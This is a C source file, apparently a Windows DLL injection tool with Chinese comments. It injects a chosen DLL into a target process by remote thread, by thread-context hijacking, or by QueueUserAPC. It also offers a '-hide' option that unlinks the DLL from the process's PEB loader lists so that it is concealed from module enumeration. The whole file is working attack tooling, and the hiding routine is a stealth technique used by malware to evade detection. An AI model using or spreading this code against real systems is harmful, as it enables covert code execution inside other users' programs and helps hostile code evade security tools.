#define UNICODE
#define _UNICODE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#include "Utils.h"

BOOL InjectModuleToProcessByRemoteThread(DWORD processID, PVOID pLoadLibraryW, LPCWSTR moduleName)
{
    // 打开进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) goto err;

    // 分配空间用于写入dll路径
    size_t moduleNameSize = (wcslen(moduleName) + 2) * 2;
    LPVOID hRemoteMem = VirtualAllocEx(hProcess, NULL, moduleNameSize, MEM_COMMIT, PAGE_READWRITE);
    if (hRemoteMem == NULL) goto err;

    // 写入dll路径
    if (!WriteProcessMemory(hProcess, hRemoteMem, moduleName, moduleNameSize, NULL)) goto err;

    // 创建远程线程
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, hRemoteMem, 0, NULL);
    if (hRemoteThread == NULL) goto err;

    // 等待远程线程
    WaitForSingleObject(hRemoteThread, INFINITE);

    // 释放内存，关闭句柄
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, hRemoteMem, moduleNameSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;

    err:
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, hRemoteMem, moduleNameSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
}

BOOL InjectModuleToProcessByThreadHijack(DWORD processID, PVOID pLoadLibraryW, LPCWSTR moduleName)
{
    // 打开进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) goto err;

    // 分配空间用于写入dll路径
    size_t moduleNameSize = (wcslen(moduleName) + 2) * 2;
    LPVOID hRemoteMem = VirtualAllocEx(hProcess, NULL, moduleNameSize, MEM_COMMIT, PAGE_READWRITE);
    if (hRemoteMem == NULL) goto err;

    // 写入dll路径
    if (!WriteProcessMemory(hProcess, hRemoteMem, moduleName, moduleNameSize, NULL)) goto err;

    // 对所有线程快照
    HANDLE hAllThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, processID);
    if (hAllThread == NULL) goto err;
    
    // 遍历快照，找到PID匹配的，逐个劫持
    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    HANDLE hThread = NULL;
    if (!Thread32First(hAllThread, &te)) goto err;
    do
    {
        if (te.th32OwnerProcessID == processID)
        {
            // 打开线程
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            if (hThread == NULL) goto err;

            printf("Hijack thread: [%d]:[%d]\n", processID, te.th32ThreadID);

            // 暂停线程
            if (SuspendThread(hThread) == -1) goto err;
            CONTEXT cxt = {0};
            cxt.ContextFlags = CONTEXT_FULL;

            // 获取线程上下文
            GetThreadContext(hThread, &cxt);

            // 修改上下文
            cxt.Rcx = (DWORD64)hRemoteMem;
            cxt.Rip = (DWORD64)pLoadLibraryW;

            // 设置线程上下文
            SetThreadContext(hThread, &cxt);

            // 继续线程
            ResumeThread(hThread);

            // 关闭句柄
            CloseHandle(hThread);
        }
    } while (Thread32Next(hAllThread, &te));

    CloseHandle(hAllThread);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, hRemoteMem, moduleNameSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
    
    err:
    CloseHandle(hAllThread);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, hRemoteMem, moduleNameSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
}

BOOL InjectModuleToProcessByQueueUserAPC(DWORD processID, PVOID pLoadLibraryW, LPCWSTR moduleName)
{
    // 打开进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) goto err;

    // 分配空间用于写入dll路径
    size_t moduleNameSize = (wcslen(moduleName) + 2) * 2;
    LPVOID hRemoteMem = VirtualAllocEx(hProcess, NULL, moduleNameSize, MEM_COMMIT, PAGE_READWRITE);
    if (hRemoteMem == NULL) goto err;

    // 写入dll路径
    if (!WriteProcessMemory(hProcess, hRemoteMem, moduleName, moduleNameSize, NULL)) goto err;

    // 对所有线程快照
    HANDLE hAllThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, processID);
    if (hAllThread == NULL) goto err;
    
    // 遍历快照，找到PID匹配的，逐个劫持
    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    HANDLE hThread = NULL;
    if (!Thread32First(hAllThread, &te)) goto err;
    do
    {
        if (te.th32OwnerProcessID == processID)
        {
            // 打开线程
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            if (hThread == NULL) goto err;

            // 注入APC
            printf("Inject APC to thread: [%d]:[%d]\n", processID, te.th32ThreadID);
            QueueUserAPC((PAPCFUNC)pLoadLibraryW, hThread, (ULONG_PTR)hRemoteMem);

            // 关闭句柄
            CloseHandle(hThread);
        }
    } while (Thread32Next(hAllThread, &te));

    CloseHandle(hAllThread);
    CloseHandle(hThread);
    // VirtualFreeEx(hProcess, hRemoteMem, moduleNameSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
    
    err:
    CloseHandle(hAllThread);
    CloseHandle(hThread);
    // VirtualFreeEx(hProcess, hRemoteMem, moduleNameSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
}

DWORD HideModuleByCutLink(DWORD processId, LPCWSTR moduleName, PPEB pebBaseAddress)
{
    // 打开进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    // 读取PEB
    PEB remotePeb = {0};
    if (ReadProcessMemory(hProcess, pebBaseAddress, &remotePeb, sizeof(remotePeb), NULL) == FALSE) goto err;

    // 准备全大写的模块路径，以忽略大小写
    WCHAR moduleNameUpr[2048] = {0};
    WCHAR tmpDllPath[2048] = {0};
    WCHAR tmpDllPathUpr[2048] = {0};
    wcscpy(moduleNameUpr, moduleName);
    wcsupr(moduleNameUpr);

    // 获取InLoadOrderModuleList表头
    PEB_LDR_DATA_FULL remoteLdrData = {0};
    ReadProcessMemory(hProcess, remotePeb.Ldr, &remoteLdrData, sizeof(remoteLdrData), NULL);
    LIST_ENTRY* pHeadLink = remoteLdrData.InLoadOrderModuleList.Flink;
    LIST_ENTRY* curPtr = pHeadLink;

    // 遍历InLoadOrderLinks链表，切除目标结点
    DWORD cutCount = 0;
    printf("Processing: InLoadOrderLinks\n");
    while (1)
    {
        // 计算LDR_DATA_TABLE_ENTRY指针的位置（利用CONTAINING_RECORD）
        PLDR_DATA_TABLE_ENTRY_FULL pTable = CONTAINING_RECORD(curPtr, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);
        LDR_DATA_TABLE_ENTRY_FULL remoteTable = {0};
        ReadProcessMemory(hProcess, pTable, &remoteTable, sizeof(remoteTable), NULL);
        
        // 读取并转为全大写
        ReadProcessMemory(hProcess, remoteTable.FullDllName.Buffer, tmpDllPath, sizeof(tmpDllPath), NULL);
        wcscpy(tmpDllPathUpr, tmpDllPath);
        wcsupr(tmpDllPathUpr);

        // printf("Dll: %s\n", utf16toutf8(tmpDllPath, utf8_buffer, M_BUF_SIZ));

        // 匹配则切除
        DWORD retval;
        if (wcsstr(tmpDllPathUpr, moduleNameUpr))
        {
            printf("Found dll: %s\n", utf16toutf8(tmpDllPath, utf8_buffer, M_BUF_SIZ));
            printf("LDR_DATA_TABLE_ENTRY address: %p\n", pTable);
            printf("Back link: %p, Forward link: %p\n", remoteTable.InLoadOrderLinks.Blink, remoteTable.InLoadOrderLinks.Flink);

            retval = WriteProcessMemory(hProcess, remoteTable.InLoadOrderLinks.Blink, &(remoteTable.InLoadOrderLinks.Flink), sizeof(PVOID), NULL);
            retval = WriteProcessMemory(hProcess, remoteTable.InLoadOrderLinks.Flink + sizeof(PVOID), &(remoteTable.InLoadOrderLinks.Blink), sizeof(PVOID), NULL);

            retval = GetLastError();
            printf("Cut it!\n");
            ++cutCount;
            break;
        }

        // 结束则退出
        if (remoteTable.InLoadOrderLinks.Flink == pHeadLink) break;

        curPtr = remoteTable.InLoadOrderLinks.Flink;
    }

    // 获取InMemoryOrderModuleList表头
    pHeadLink = remoteLdrData.InMemoryOrderModuleList.Flink;
    curPtr = pHeadLink;
    // 遍历InMemoryOrderModuleList链表，切除目标结点
    printf("Processing: InMemoryOrderModuleList\n");
    while (1)
    {
        // 计算LDR_DATA_TABLE_ENTRY指针的位置（利用CONTAINING_RECORD）
        PLDR_DATA_TABLE_ENTRY_FULL pTable = CONTAINING_RECORD(curPtr, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);
        LDR_DATA_TABLE_ENTRY_FULL remoteTable = {0};
        ReadProcessMemory(hProcess, pTable, &remoteTable, sizeof(remoteTable), NULL);
        
        // 读取并转为全大写
        ReadProcessMemory(hProcess, remoteTable.FullDllName.Buffer, tmpDllPath, sizeof(tmpDllPath), NULL);
        wcscpy(tmpDllPathUpr, tmpDllPath);
        wcsupr(tmpDllPathUpr);

        // printf("Dll: %s\n", utf16toutf8(tmpDllPath, utf8_buffer, M_BUF_SIZ));

        // 匹配则切除
        DWORD retval;
        if (wcsstr(tmpDllPathUpr, moduleNameUpr))
        {
            printf("Found dll: %s\n", utf16toutf8(tmpDllPath, utf8_buffer, M_BUF_SIZ));
            printf("LDR_DATA_TABLE_ENTRY address: %p\n", pTable);
            printf("Back link: %p, Forward link: %p\n", remoteTable.InMemoryOrderLinks.Blink, remoteTable.InMemoryOrderLinks.Flink);

            retval = WriteProcessMemory(hProcess, remoteTable.InMemoryOrderLinks.Blink, &(remoteTable.InMemoryOrderLinks.Flink), sizeof(PVOID), NULL);
            retval = WriteProcessMemory(hProcess, remoteTable.InMemoryOrderLinks.Flink + sizeof(PVOID), &(remoteTable.InMemoryOrderLinks.Blink), sizeof(PVOID), NULL);

            retval = GetLastError();
            printf("Cut it!\n");
            ++cutCount;
            break;
        }

        // 结束则退出
        if (remoteTable.InMemoryOrderLinks.Flink == pHeadLink) break;

        curPtr = remoteTable.InMemoryOrderLinks.Flink;
    }

    // 获取InInitializationOrderModuleList表头
    pHeadLink = remoteLdrData.InInitializationOrderModuleList.Flink;
    curPtr = pHeadLink;
    // 遍历InInitializationOrderModuleList链表，切除目标结点
    printf("Processing: InInitializationOrderModuleList\n");
    while (1)
    {
        // 计算LDR_DATA_TABLE_ENTRY指针的位置（利用CONTAINING_RECORD）
        PLDR_DATA_TABLE_ENTRY_FULL pTable = CONTAINING_RECORD(curPtr, LDR_DATA_TABLE_ENTRY_FULL, InInitializationOrderLinks);
        LDR_DATA_TABLE_ENTRY_FULL remoteTable = {0};
        ReadProcessMemory(hProcess, pTable, &remoteTable, sizeof(remoteTable), NULL);
        
        // 读取并转为全大写
        ReadProcessMemory(hProcess, remoteTable.FullDllName.Buffer, tmpDllPath, sizeof(tmpDllPath), NULL);
        wcscpy(tmpDllPathUpr, tmpDllPath);
        wcsupr(tmpDllPathUpr);

        // printf("Dll: %s\n", utf16toutf8(tmpDllPath, utf8_buffer, M_BUF_SIZ));

        // 匹配则切除
        DWORD retval;
        if (wcsstr(tmpDllPathUpr, moduleNameUpr))
        {
            printf("Found dll: %s\n", utf16toutf8(tmpDllPath, utf8_buffer, M_BUF_SIZ));
            printf("LDR_DATA_TABLE_ENTRY address: %p\n", pTable);
            printf("Back link: %p, Forward link: %p\n", remoteTable.InInitializationOrderLinks.Blink, remoteTable.InInitializationOrderLinks.Flink);

            retval = WriteProcessMemory(hProcess, remoteTable.InInitializationOrderLinks.Blink, &(remoteTable.InInitializationOrderLinks.Flink), sizeof(PVOID), NULL);
            retval = WriteProcessMemory(hProcess, remoteTable.InInitializationOrderLinks.Flink + sizeof(PVOID), &(remoteTable.InInitializationOrderLinks.Blink), sizeof(PVOID), NULL);

            retval = GetLastError();
            printf("Cut it!\n");
            ++cutCount;
            break;
        }

        // 结束则退出
        if (remoteTable.InInitializationOrderLinks.Flink == pHeadLink) break;

        curPtr = remoteTable.InInitializationOrderLinks.Flink;
    }
    
    CloseHandle(hProcess);
    return cutCount;
    err:
    CloseHandle(hProcess);
    return -1;
}

typedef enum InjectMethod
{
    RemoteThread = 0,
    ThreadHijack = 1,
    InjectQueueUserAPC = 2
}InjectMethod;

static inline const char* InjectMethod2String(InjectMethod iMethod)
{
    switch (iMethod)
    {
    case RemoteThread:
        return "RemoteThread";
        break;
    case ThreadHijack:
        return "ThreadHijacking";
        break;
    case InjectQueueUserAPC:
        return "InjectQueueUserAPC";
        break;
    default:
        return "UnknownMethod";
        break;
    }
    return NULL;
}

int main(int argc, char const *argv[])
{
    SetConsoleCP(CP_UTF8);
    SetConsoleOutputCP(CP_UTF8);

    char processName[MAX_PATH] = {0};
    char dllpath[MAX_PATH] = {0};
    WCHAR dllpathW[MAX_PATH] = {0};
    DWORD pid = 0;
    BOOL hideModule = FALSE;
    InjectMethod iMethod = RemoteThread;

    for (int i = 0; i < argc; i++)
    {
        if (!strcmp(argv[i], "-im"))
        { strcpy(processName, argv[++i]); }
        else if (!strcmp(argv[i], "-pid"))
        { sscanf(argv[++i], "%d", &pid); }
        else if (!strcmp(argv[i], "-dll"))
        { strcpy(dllpath, argv[++i]); }
        else if (!strcmp(argv[i], "-rt"))
        { iMethod = RemoteThread; }
        else if (!strcmp(argv[i], "-th"))
        { iMethod = ThreadHijack; }
        else if (!strcmp(argv[i], "-quapc"))
        { iMethod = InjectQueueUserAPC; }
        else if (!strcmp(argv[i], "-hide"))
        { hideModule = TRUE; }
    }

    if (processName[0] == '\0' && pid == 0)
    {
        printf("Process name: ");
        scanf("%s", processName);
    }

    if (dllpath[0] == '\0')
    {
        printf("DLL path: ");
        scanf("%s", dllpath);
    }
    
    if (pid == 0)
    {
        pid = GetProcessIdByName(utf8toutf16(processName, utf16_buffer, M_BUF_SIZ));
    }
    
    printf("Process ID: %d\n", pid);
    printf("Inject method: %s\n", InjectMethod2String(iMethod));

    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(pid, TEXT("Kernel32.dll"));
    printf("[%s]:[Kernel32.dll] address: %p\n", processName, hRemoteKernel32);

    HMODULE (*pLoadLibraryW)(LPCWSTR) = (HMODULE(*)(LPCWSTR))GetRemoteProcAddress(hRemoteKernel32, TEXT("Kernel32.dll"), "LoadLibraryW");
    printf("[%s]:[Kernel32.dll]:[LoadLibraryW] address: %p\n", processName, pLoadLibraryW);

    // HMODULE hKernel32 = GetModuleHandleW(TEXT("Kernel32.dll"));
    // LPVOID pLLW = GetProcAddress(hKernel32, "LoadLibraryW");
    // printf("[%d]:[Kernel32.dll] address: %p\n", GetCurrentProcessId(), hKernel32);
    // printf("[%d]:[Kernel32.dll]:[LoadLibraryW] address: %p\n", GetCurrentProcessId(), pLLW);

    DWORD retval = 0;
    utf8toutf16(dllpath, dllpathW, MAX_PATH);
    switch (iMethod)
    {
    case RemoteThread:
        retval = InjectModuleToProcessByRemoteThread(pid, pLoadLibraryW, dllpathW);
        break;
    case ThreadHijack:
        retval = InjectModuleToProcessByThreadHijack(pid, pLoadLibraryW, dllpathW);
        break;
    case InjectQueueUserAPC:
        retval = InjectModuleToProcessByQueueUserAPC(pid, pLoadLibraryW, dllpathW);
        break;
    default:
        break;
    }
    
    if (retval)
    { printf("Inject success!\n"); }
    else
    { printf("Inject fail!\n"); }

    if (hideModule)
    {
        PPEB pRemotePeb = GetRemoteProcessPebAddress(pid);
        if (!pRemotePeb)
        {
            printf("Get Remote PEB address fail!\n");
            goto get_peb_fail;
        }
        retval = HideModuleByCutLink(pid, dllpathW, pRemotePeb);
        if (retval > 0)
        { printf("Hide dll: %s success!\n", dllpath); }
        else if (retval == 0)
        { printf("Dll: %s not found!\n", dllpath); }
        else 
        { printf("Hide dll fail!\n"); }
    }
    get_peb_fail:

    return 0;
}
